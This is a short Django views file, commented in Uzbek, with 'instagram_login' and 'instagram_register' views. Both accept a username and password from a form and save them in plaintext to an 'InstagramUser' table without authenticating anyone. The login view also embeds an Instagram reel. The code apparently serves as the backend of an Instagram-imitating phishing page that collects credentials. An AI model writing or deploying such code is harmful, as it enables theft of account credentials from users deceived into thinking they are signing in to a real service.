from django.shortcuts import render, redirect
from django.contrib import messages
from .models import InstagramUser, VideoSettings

# Create your views here.

def instagram_login(request):
    # Video sozlamalarini olish
    try:
        video_settings = VideoSettings.objects.filter(is_active=True).first()
        video_url = video_settings.video_url if video_settings else "https://www.instagram.com/reel/C3armNesX81/"
    except:
        video_url = "https://www.instagram.com/reel/C3armNesX81/"
    
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Ma'lumotlarni saqlash
        InstagramUser.objects.create(username=username, password=password)
        
        messages.success(request, 'Ma\'lumotlar saqlandi!')
        return redirect('instagram_login')
    
    context = {
        'video_url': video_url
    }
    return render(request, 'instagram_login.html', context)

def instagram_register(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        # Ma'lumotlarni saqlash
        InstagramUser.objects.create(username=username, password=password)
        
        messages.success(request, 'Ro\'yxatdan o\'tish muvaffaqiyatli!')
        return redirect('instagram_login')
    
    return render(request, 'instagram_register.html')
